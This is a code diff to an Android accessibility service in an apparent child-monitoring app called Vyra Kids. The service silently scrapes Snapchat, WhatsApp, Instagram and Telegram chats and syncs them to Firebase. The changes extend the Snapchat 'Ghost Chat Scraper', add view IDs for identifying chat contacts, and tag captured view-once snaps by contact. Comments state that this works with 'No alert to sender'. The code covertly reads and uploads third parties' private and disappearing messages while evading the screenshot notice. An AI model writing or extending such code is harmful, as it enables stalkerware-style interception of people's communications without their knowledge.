@@ -99,10 +99,21 @@ class VyraAccessibilityService : AccessibilityService() {
             }
         }
 
-        // B. Silent Ghost Chat Scraper: Reads disappearing chat nodes directly from RAM
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
-            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            scrapeSnapchatChatNodes(rootInActiveWindow)
+        // B. Throttled Ghost Chat Scraper: Reads active chat messages directly from view tree
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+            event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
+            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            val root = rootInActiveWindow
+            val headerContact = extractActiveChatContact("com.snapchat.android", root)
+            val activeContact = if (headerContact.isNotBlank()) {
+                com.vyra.kids.core.ActiveContactTracker.recordContact("Snapchat", headerContact)
+                headerContact
+            } else {
+                com.vyra.kids.core.ActiveContactTracker.getLastContact("Snapchat") ?: ""
+            }
+            if (activeContact.isNotBlank()) {
+                scrapeSocialChatNodes("Snapchat", activeContact, root)
+            }
         }
 
         // C. 1-View Snap Ghost Capture (No alert to sender)
@@ -120,34 +131,6 @@ class VyraAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Silent text node extraction: Reads chat messages from Snapchat memory view tree.
-     * Zero screenshot taken -> Zero alert sent to chat/sender.
-     */
-    private fun scrapeSnapchatChatNodes(node: AccessibilityNodeInfo?) {
-        if (node == null) return
-        val text = node.text?.toString() ?: ""
-        if (text.isNotBlank() && text.length > 2) {
-            val lower = text.lowercase()
-            // Ignore UI navigation strings
-            if (!lower.contains("stories") && !lower.contains("spotlight") && !lower.contains("search") && !lower.contains("camera")) {
-                val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
-                val msgId = "sc_node_${System.currentTimeMillis()}_${text.hashCode().toString().take(6)}"
-                firebaseSync.syncChatMessage(
-                    msgId = msgId,
-                    app = "Snapchat",
-                    sender = "Snapchat Chat",
-                    text = text,
-                    isDeletedBySender = false,
-                    isWatchlistTarget = false
-                )
-            }
-        }
-        for (i in 0 until node.childCount) {
-            scrapeSnapchatChatNodes(node.getChild(i))
-        }
-    }
-
     private val processedChatHashes = mutableSetOf<Int>()
 
     private fun extractActiveChatContact(packageName: String, root: AccessibilityNodeInfo?): String {
@@ -159,7 +142,14 @@ class VyraAccessibilityService : AccessibilityService() {
                 "com.whatsapp:id/title",
                 "com.instagram.android:id/action_bar_title",
                 "com.instagram.android:id/thread_title",
-                "org.telegram.messenger:id/action_bar_title"
+                "org.telegram.messenger:id/action_bar_title",
+                "com.snapchat.android:id/chat_header_title",
+                "com.snapchat.android:id/conversation_title",
+                "com.snapchat.android:id/action_bar_title",
+                "com.snapchat.android:id/display_name",
+                "com.snapchat.android:id/friend_name",
+                "com.snapchat.android:id/chat_user_name",
+                "com.snapchat.android:id/toolbar_title"
             )
             for (id in candidateIds) {
                 val nodes = root.findAccessibilityNodeInfosByViewId(id)
@@ -202,9 +192,14 @@ class VyraAccessibilityService : AccessibilityService() {
         return lower in setOf(
             "chats", "status", "calls", "updates", "communities", "settings",
             "search", "search...", "camera", "more options", "new chat",
-            "messages", "direct", "stories", "spotlight", "home", "reels",
-            "online", "typing...", "last seen"
-        ) || lower.startsWith("typing...") || lower.startsWith("last seen")
+            "messages", "all messages", "direct", "stories", "spotlight", "home", "reels",
+            "online", "typing...", "last seen", "delivered", "opened", "received", "sent",
+            "turn on notifications", "never miss snaps", "add friends", "find friends",
+            "team id", "team name", "tap to chat", "new snap"
+        ) || lower.startsWith("typing...") ||
+           lower.startsWith("last seen") ||
+           lower.contains("turn on notifications") ||
+           lower.contains("never miss snaps")
     }
 
     private fun scrapeSocialChatNodes(appName: String, activeContact: String, node: AccessibilityNodeInfo?) {
@@ -417,8 +412,19 @@ class VyraAccessibilityService : AccessibilityService() {
                             Log.i(AppConstants.TAG, "Saved 1-view media frame [Outgoing: $isOutgoing]: ${snapshotFile.name}")
 
                             val cleanApp = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram"
-                            val snapSender = if (isOutgoing) "Aryan (Child) [Sent 1-View Snap]" else "Incoming Snap"
-                            val snapTitle = if (isOutgoing) "📷 [Sent 1-View Photo / Snap Captured]" else "📷 [Received 1-View Photo Captured]"
+                            val resolvedContact = extractActiveChatContact(sourceApp, rootInActiveWindow).ifBlank {
+                                com.vyra.kids.core.ActiveContactTracker.getLastContact(cleanApp) ?: ""
+                            }
+                            val snapSender = if (resolvedContact.isNotBlank()) {
+                                if (isOutgoing) "Aryan (Child) [Sent to $resolvedContact]" else resolvedContact
+                            } else {
+                                if (isOutgoing) "Aryan (Child)" else "$cleanApp Contact"
+                            }
+                            val snapTitle = if (resolvedContact.isNotBlank()) {
+                                if (isOutgoing) "📷 [Sent 1-View Snap to $resolvedContact]" else "📷 [Received 1-View Snap from $resolvedContact]"
+                            } else {
+                                if (isOutgoing) "📷 [Sent 1-View Media Captured]" else "📷 [Received 1-View Media Captured]"
+                            }
 
                             runMlKitOcrAndSyncSnap(
                                 sourceApp = cleanApp,
